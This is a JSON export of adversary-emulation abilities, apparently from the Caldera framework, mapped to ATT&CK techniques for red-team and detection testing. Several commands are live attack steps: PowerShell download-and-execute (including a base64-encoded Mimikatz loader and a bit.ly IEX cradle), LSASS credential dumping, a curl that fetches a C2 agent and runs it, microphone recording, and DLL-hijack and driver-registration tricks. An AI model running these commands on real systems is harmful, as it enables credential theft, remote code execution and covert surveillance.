        "description": "Establish persistence via a rule run by OSX's emond (Event Monitor) daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Persistance with Event Monitor - emond",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "8f4efa00-bbb6-4221-9dc2-1c4292d944c0",
        "buckets": [],
        "privilege": "",
        "technique_name": "Word spawned a command shell and used an IP address in the command line",
        "technique_id": "T1566.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item C:\\Users\\Public\\art.jse -ErrorAction Ignore"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \" Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n Shell`$ `\"ping 8.8.8.8`\"`n\";\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"'",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {
            "cleanup": "[]"
        },
        "access": {},
        "description": "Word spawning a command prompt then running a command with an IP address in the command line is an indiciator of malicious activity. Upon execution, CMD will be lauchned and ping 8.8.8.8",
        "plugin": "",
        "singleton": true,
        "delete_payload": true,
        "name": "Phishing: Spearphishing Attachment",
        "tactic": "initial-access",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "ac9dce33-2acc-4b34-94ce-2596409ce8f0",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "technique_id": "T1016",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Ping the network in order to build the ARP cache",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Ping network",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "424bc481ab003275752aad9c6b2d946a",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "technique_id": "T1204.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Stop-Process -name PotentiallyUnwanted; Remove-Item $env:TEMP/PotentiallyUnwanted.exe -ErrorAction Ignore"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe; & \"$env:TEMP/PotentiallyUnwanted.exe\"",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Potentially Unwanted Applications (PUA)",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "ccdb8caf-c69e-424b-b930-551969450c57",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "technique_id": "T1059.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Download",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "PowerShell Invoke MimiKats",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "4d9b079c-9ede-4116-8b14-72ad3a5533af",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Capture running processes via PowerShell",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "PowerShell Process Enumeration",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "bfff9006-d1fb-46ce-b173-92cb04e9a031",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "technique_id": "T1059.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\")",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Download",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "PowerShell bitly Link Download",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "702bfdd2-9947-4eda-b551-c3a1ea9a59a2",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "technique_id": "T1059.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "System Information Gathering Script",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "PowerShell information gathering",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "29451844-9b76-4e16-a9ee-d6feab4b24db",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Information Discovery",
        "technique_id": "T1082",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$PSVersionTable",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$PSVersionTable",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Discover the PowerShell version",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "PowerShell version",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "7049e3ec-b822-4fdf-a4ac-18190f9b66d1",
        "buckets": [
            "credential-access"
        ],
        "privilege": "Elevated",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "technique_id": "T1003.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.katz",
                        "parserconfigs": [
                            {
                                "edge": "has_password",
                                "target": "domain.user.password",
                                "source": "domain.user.name",
                                "custom_parser_vals": {}
                            },
                            {
                                "edge": "has_hash",
                                "target": "domain.user.ntlm",
                                "source": "domain.user.name",
                                "custom_parser_vals": {}
                            },
                            {
                                "edge": "has_hash",
                                "target": "domain.user.sha1",
                                "source": "domain.user.name",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "invoke-mimi.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Use Invoke-Mimikatz",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Powerkatz (Staged)",
        "tactic": "credential-access",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "technique_id": "T1016",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "./wifi.sh pref",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.wifipref",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "wifi.network.ssid",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "wifi.sh"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "./wifi.sh pref",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.wifipref",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "wifi.network.ssid",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "wifi.sh"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": ".\\wifi.ps1 -Pref",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.wifipref",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "wifi.network.ssid",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "wifi.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "See the most used WIFI networks of a machine",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Preferred WIFI",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "6e1a53c0-7352-4899-be35-fa7f364d5722",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "technique_id": "T1083",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "pwd",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "pwd",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "pwd",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Print the current working directory on the system",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Print Working Directory",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "1d48fc4147a7bcd47bdf60db7dde9640",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-Process",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Process Discovery - Get-Process",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "1ddf2b8ee6a56ce9f9132a168947653e",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "get-wmiObject -class Win32_Process",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Process Discovery - get-wmiObject",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "453b8d81c6118310308fb5b22de12235",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm /tmp/loot.txt"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ps >> /tmp/loot.txt; ps aux >> /tmp/loot.txt",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "rm /tmp/loot.txt"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ps >> /tmp/loot.txt; ps aux >> /tmp/loot.txt",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Process Discovery - ps",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "f8de05d1741dcc468f772ab0ff4dac72",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tasklist",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Process Discovery - tasklist",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "b2a1e430ca6d36eb5af2fe666e769847",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "wmic process get /format:list",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Utilize windows management instrumentation to identify processes.\n\nUpon successful execution, WMIC will execute process to list processes. Output will be via stdout. \n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Process Discovery - wmic process",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "2488245e-bcbd-405d-920e-2de27db882b3",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Query Registry",
        "technique_id": "T1012",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Query Registry using PowerShell Get-ItemProperty",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Query Registry",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3b007f46-23e7-4a11-9c14-e7085b6a754a",
        "buckets": [
            "impact"
        ],
        "privilege": "",
        "technique_name": "Service Stop",
        "technique_id": "T1489",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "quit app \"Microsoft Outlook.app\"",
                "name": "osa",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Quit Outlook",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Quit Outlook",
        "tactic": "impact",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "0ab383be-b819-41bf-91b9-1bd4404d83bf",
        "buckets": [
            "command-and-control"
        ],
        "privilege": "",
        "technique_name": "Application Layer Protocol: Web Protocols",
        "technique_id": "T1071.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "pkill -f ragdoll"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "pkill -f ragdoll"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:linux\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "A Python agent which communicates via the HTML contact",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Ragdoll",
        "tactic": "command-and-control",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "1db8479efec9b1188b14cfa138c0cf12",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Direct Volume Access",
        "technique_id": "T1006",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \"\\\\.\\C:\", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 ëR?NTFS\n```",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Read volume boot sector via DOS device path (PowerShell)",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "78524da1-f347-4fbb-9295-209f1f408330",
        "buckets": [
            "impact"
        ],
        "privilege": "",
        "technique_name": "Resource Hijacking",
        "technique_id": "T1496",
        "executors": [
            {
                "timeout": 120,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "brew install sox >/dev/null 2>&1;\nsox -d recording.wav trim 0 15 >/dev/null 2>&1;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Install sox and record microphone for n-seconds",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Record microphone",
        "tactic": "impact",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "2e0a44f9919a362689beea79fbf485a9",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Run Virtual Instance",
        "technique_id": "T1564.006",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "sc stop VBoxDRV && sc delete VBoxDRV && regsvr32 /u /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\" && msiexec /x 8af345_Virtualbox_52.msi /qn"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxSVC.exe\" /reregserver && regsvr32 /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\" && rundll32 \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxRT.dll,RTR3Init\" && sc create VBoxDRV binpath= \"C:\\Program Files\\Oracle\\VirtualBox\\drivers\\VboxDrv.sys\" type= kernel start= auto error= normal displayname= PortableVBoxDRV && sc start VBoxDRV",
                "name": "cmd",
                "parsers": [],
                "payloads": [
                    "8af345_Virtualbox_52.msi"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Register Portable Virtualbox",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "372e6f46fca18e4f1b43209c20ffafa2",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Audio Capture",
        "technique_id": "T1123",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /f"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Registry artefact when application use microphone",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "1f15da077e50b6a18c8ad3305f8e4b6e",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Hijack Execution Flow: COR_PROFILER",
        "technique_id": "T1574.012",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "$env:COR_ENABLE_PROFILING = 0; $env:COR_PROFILER = ''; $env:COR_PROFILER_PATH = ''"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$env:COR_ENABLE_PROFILING = 1; $env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'; $env:COR_PROFILER_PATH = '83f016_T1574.012x64.dll'; POWERSHELL -c 'Start-Sleep 1'",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "83f016_T1574.012x64.dll"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Registry-free process scope COR_PROFILER",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "921055f4-5970-4707-909e-62f594234d91",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "technique_id": "T1016",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ping #{remote.host.fqdn}",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.firewallping",
                        "parserconfigs": [
                            {
                                "edge": "isAccessibleFrom",
                                "target": "",
